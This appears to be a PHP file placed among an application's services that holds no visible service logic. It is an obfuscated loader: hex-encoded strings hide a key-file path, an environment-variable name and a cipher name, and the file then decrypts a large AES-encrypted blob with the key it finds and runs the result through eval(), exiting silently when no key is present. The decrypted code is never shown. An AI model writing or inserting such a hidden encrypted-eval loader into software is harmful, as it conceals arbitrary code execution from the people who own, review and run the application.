<?php
namespace App\Services;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zB3okjHrW8Zrj7FA9OKlcQ==');

$c=base64_decode(

'8Q8Sey+/OtpVumMrdRDSJtgxHbfdvjtDuo9VK/wgeE2Hbjcs6HV++sVA1pvg7sXSz1rvnI5AsWmj' .
'UYWerzKF0/m5hukK0+Zm35KTgV8L3n3pg2j0vtOjtxpbosYJHl9PLeqjOl6fmYpwSpZsnIObvNrq' .
'lumnGtAamO9KKK0+qzhMfA2umMh96spVr6Llm6r0VLdPyOi79BdUtRH6wkHh5KTjSTbwrNvwgJaG' .
'BbpIntU3MlqJCiAX33PGuEk90GoGQ+7woKHsnsTLQBm3yVoA8EC22xUR6yXp+Z7PehiCIeQGHJdh' .
'bgt5I1o1isJaxSZAl6dd+okslqW7G0Sy0w8JrnSrrEOhrksc7IWSQVJyAzxLnjdxI1m81yfDNLMH' .
'hvtpzJky8xWYypN877mGSXfpLcoeDUv8neVCqtzNtDgsQVFTfpHIUtxgu61BOnH6Je4hQDaz7cqy' .
'yWNqIqsY3TmrMF9+fYuBHDOr90pqhTCHfhp8wltsYsq5sFOtgPDBCxWwhgjWJcK2JdzMjDaiHbXB' .
'G7wDNENlfZO9GGwSnea2rq5UZblOiTl7JYzuS3n1VuE1vsYbCAf3WIG27aOXRpUZwya7wN4NAtqh' .
'ZYQCqKNW/0stjDXGqFmxq2qZ1ozKYgqeD48wMHJXWIt0th8ZvYDR0TYJwm/XtAJtnXmRflZYObVc' .
'Hz7BKATGpbu9lBVdWkMf4zu+KoRfj1VI/HwqFIMEl5+XWXEHYAudO+uDkWUY62FeK19Pxm0LbooD' .
'3KiIw6WVoUa6JWochucdSLAugsGkeGHh9Pu+j2hrTrhIJX7hsmS2ZwAQSi9VV0gLjn25hAQPTri5' .
'wIesEFWePnzhfV3BVz//BoftXa1/Fff/Jp6b3vRCvMp5aF2yqVcW04RVyqgVg6hnUMrlSalfN7+1' .
'cU2odr2VSflqOf6ovppHNqqrD9aGur/P+ejVLsuPidAMLDbc4PANIOw8+hqaJdqxTkylx/D1+89m' .
'QttcwH8JYov8fZApftmrwPosq4MRTQtvq8Odm7T9MQtkGMTDvxB0v4rLWa84y1FsjoU2c32fLP3U' .
'9Cx2HEax9MERtFC/QXV7m2oy6tZ+Hj1u3j9FX1rylGv2t3PrvzDD9okDYiL/QThQBanZRffY/3gJ' .
'gXxJRJxxC9uGQMrkZZoLkN60ZiZC0IhgtcVUmCR3yKMgjGR2zMN25ul86HFZJDs8uqKZsAQ7oMHR' .
'wJNvp0vwDf6gLUFRVMU2LOu0mOrm7Dpc1s6ZxX2+RsCB+n03j4OlvEB//bGdeRB0e1Cfr9teA/g4' .
'CsNobvnFjCNxhdawPeGMiywOXXlxYzgG9CrVPZZqxriikoI7CCp1V3WhbKhrrA59s9H2ztdUaFjy' .
'gha0dihewsMDML6W25rEQMZFJe83OrEQX1nJQyoJlDpR5guId0oFAGJxplGB07HIIsW71GBTDCIQ' .
'FOMzLStb1NCEm+pcJyPemn2s7Ku5XHgUPuU52VeiAKuUGrweUwHEQlga8QYv1Bo6wBkDoWAsc3si' .
'fbw18l09OGQeP07nJpXU938SuCK3jip8mfRxXJgw0+t42XZ38H62Fbn2IfUtnET4TLJir26f4ghB' .
'Naprn/zs02f1vWIZmqYqKeFzyUPVV3/ielGnqmjvh+rCEP5kgOMFq31s+Dp1gFoNt+oHG+u7WDfr' .
'429NCnunbjEP+5JAtUIG2IsriNnK9zPwNg2fw2qTbJop5gY0m63vHZQUh+4Fe3WNPV/Sq4kFOjEo' .
'f32Ps3/AlfPHewMiA17jBk4wt0rBCZBOlbmg6H0QhzV0BH86yDemciwI/zvmC9q+HV+TS84sU92a' .
'jvQL1MTMCYodCAV6wjqjRU6D7pejGrFoZnD4zBiRgr4BRz8xn/GbxX+b+NW5s6eb5QzfcgZ48uc/' .
'kdQd6nF+g8Me8ewwwl9L92AUn9DDPzpXj0RFUSUpZGAWRFEE9ZpvjbgTCQikyQfBZVRmviuG4ujT' .
'34aSGVkjjqNCAcWkAjqnrzPDf1na+E9vUj+n4mPatq6DpEcg/z6y6zpN5rp6BSWJ45cV/Mp3tHe6' .
'5K0GpTEM6/zL3rVi7yWg/cqF3gghEfI9Fkkf5VAdyGwvm+DhL4wKgXaVP2XC241WN/7RaMErfSRf' .
'uPvTjNR5zGy7PVmk2EQHF3b9uR21amDonk1FSgJS2DWfzWM9/38qWWkUFaO+eSo/cySPKaKbfsTx' .
'9F4MzrBrkkWu9eO/ekfW+ij07oECDqExMd3K5UFZl4+RhN6t9BqJZfnZZp9LtPrCSCHGn/wej1HS' .
'M1FQqINs3vuOb9/qwyoKqnYBcA8Tw4na6EzAMHvYc2nxiSSyEtSeltWCRyehuG2KtFiqFt8ocsEN' .
'YEI/M+M7oosuQCnxQyQACvB5CBDKu25zaw5nY0IC3eD8bE62arQR36Zq1zoxZOM33lp1q/SYqq6m' .
'S/nyfT86eEB8kBM435YrhbC2pdCs/Cs2iRLQ5l19Xn9fURM8cU+PJGYBh6Z9HkQVYT89re+4fgfN' .
'kMhNlSR2XI/PzA6yYmDNw9O6PNdShmDIQ64w7Aut8klDFqKGv84VTuGQND1xushFGtbgc0dbTpYH' .
'GWjeuWd3nwL/jcRpdVyXNaj41PjcLMb3P/GEHsVzYgKoaYHvCMJkRtEww55o10wppNYHGmmto/kg' .
'01JWBiOJWe91jer5ELXbQGfyoaGb4Vqkpl8NHqF0ckpEg4e6zVEknsREaMr7ARACcDqlTvhZcJyR' .
'6mBjOVtlQfOAmdGgUrwmj+MFS2kXZgZzZxFrw2teI82vSHq6/fiMN0E9VzZE/K4vhox8qRlocLBJ' .
'1gIYqA7z9T/9+TqROyRaw2kAgaLIdMF2f2LZvITG3+l5I9ljVTT+gH5UL0hZQONLe38KE6YPRmPG' .
'Yf8mmen7QTkEQo9OTnajJJvLz7q5r/WN/g/kv5J39lus5AcW0y8fCfti6AECtFndJExO1UL+1swf' .
'kzqO4b1QsDmy1UbmV+7zUnPC9ae53zeYNJf6nPbYmsBgiXT8QTmg9zzXMwCnkKhNX4oTIk0i0ry6' .
'AnqsrKZUQMLfADiu8iA8E3rMuUAb7eD9ZJRlR+2liElV98n4kk/VQIGWGHn8S0sfFM5BdV/I1NRo' .
'0dnNR6lQ4rg4qRko0XhmJbKt79L0qkz2y5C/X/WV+YFQcpj/fNz+SHkQRS67kGrv7LpooQPiIfl3' .
'EDyRlmuekfAgF22/ahVga5D/3PsibzFfK7rHJ0bv1Irqkajn0YcOfEfCVoRPYAQtplh0ywY71Vvn' .
'J92W8ljTo+UQnYB0R1WIA9cAISRCxNs1I8h+AULdJ17MCPv4BgHesrCrNo9wR7mopB8JZ7HOXIJQ' .
'bOZF43YaE5eftY3E7muphmKuX/QIlL21sPzDs5zwDOPscnFydIVGsnO916sxM+ShSDeQyDn/kb7t' .
'a9vyumsEhZ7Wlw8='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

